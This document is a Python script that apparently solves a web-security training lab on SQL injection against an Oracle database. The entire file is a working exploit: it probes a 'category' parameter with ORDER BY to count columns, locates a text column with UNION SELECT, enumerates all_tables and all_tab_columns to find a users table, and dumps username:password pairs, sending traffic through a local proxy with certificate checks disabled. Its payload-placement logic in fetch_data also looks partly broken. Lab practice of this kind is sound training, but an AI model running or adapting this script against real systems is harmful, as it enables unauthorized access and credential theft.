#Lab: SQL injection attack, listing the database contents on Oracle

import requests
import sys
import re
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies={"http":"http://127.0.0.1:8080","https":"http://127.0.0.1:8080"}

def main():
    try:
        url=sys.argv[1].strip()
        payload=sys.argv[2].strip()
        exploit(url,payload)
    except IndexError:
        print("[-] Usage %s <url> <payload>"%sys.argv[0])
        sys.exit(0)

def exploit(url,payload):
    url=url+"filter?category=Gifts"+payload
    for i in range(1,10):
        fuzz=url+" order by "+str(i)+" --"
        r=requests.get(fuzz,verify=False,proxies=proxies)
        if(r.status_code!=200):
            print("[+] Found No.of Cols Using Order by : "+str(i-1))
            check_no_cols(url,(i-1),payload)
            sys.exit()
def check_no_cols(url,cols,payload):
    fuzz=url+" union select"+" null,"*(cols-1)+"null from dual --"
    print("[+] checking query :")
    print(fuzz)
    r=requests.get(fuzz,verify=False,proxies=proxies)
    if(r.status_code==200):
        print("[+] Request success ")
        print("[+] Finding String Column ")
        string_col_position=finding_string_col(url,cols)
        if string_col_position:
            print("[+] Found String Column : "+str(string_col_position))
            
            
            print("[+] Finding users table Using Below Query: ")
            
            result=fetch_data(url,string_col_position,cols,"table_name","all_tables","1=1")
            soup=BeautifulSoup(result,'html.parser')
            table= soup.find(text=re.compile('^USERS_.*'))
            
            if table:
                print("[+] Found users table : "+table)
            else:
                print("[-] Not able to find users table")
                sys.exit()
            
            
            print("[+] Finding Columns of Table : "+table+" using Below Query: ")
            where_stmt=" table_name= '"+table+"'"
            result=fetch_data(url,string_col_position,cols,"column_name","all_tab_columns",where_stmt)
            soup=BeautifulSoup(result,'html.parser')
            column1= soup.find(text=re.compile('USERNAME_.*'))
            column2= soup.find(text=re.compile('PASSWORD_.*'))
            if column1 and column2:
                print("[+] Found columns of table : "+table+" column1 : "+column1+" column 2 : "+column2)
            else:
                print("[-] Not able to find columns from "+table)
                sys.exit()

            print("[+] Fetching Data from the table : "+table+" using Below Query: ")
            select_stmt=column1+"||':'||"+column2
            

            result=fetch_data(url,string_col_position,cols,select_stmt,table,"1=1")
            
            soup=BeautifulSoup(result,'html.parser')
            data=soup.findAll(text=re.compile('.[a-z0-9]:[a-z0-9].'))
            #data=soup.find("tr")["value"]
            if data:
                print("[+] Fetched Data from the table : "+str(data))
            else:
                print("[-] Not able to fetch data from "+table)
                sys.exit()

        else:
            print("[-] Not able to find string column")
            sys.exit()
    else:
        print("[-] Request Failed")

def finding_string_col(url,cols):
    
    for i in range(1,cols+1):
        string ="'kamehameha'"
        payload_list=["null"]*cols
        payload_list[i-1]=string
        fuzz=url+" union select "+" ,".join(payload_list)+" from dual --"
        
        r=requests.get(fuzz,verify=False,proxies=proxies)
        
        if string.strip("\'") in r.text:
            print("[+] Found string with below query : ")
            print(fuzz)
            return i

def fetch_data(url,string_col_position,col,select_stmt,from_stmt,where_stmt):

    payload_list=[]
    payload_list=['null']*(col-1)
    if(string_col_position >= (col-1)):
        payload_list.append(select_stmt)
    else:
        payload_list[string_col_position]=""
    fuzz=url+" union select "+" ,".join(payload_list)+" from  "+from_stmt+"  where "+where_stmt+" --"
    
    print(fuzz)
    r=requests.get(fuzz,verify=False,proxies=proxies)
    
    return r.text
if __name__=="__main__":
    main()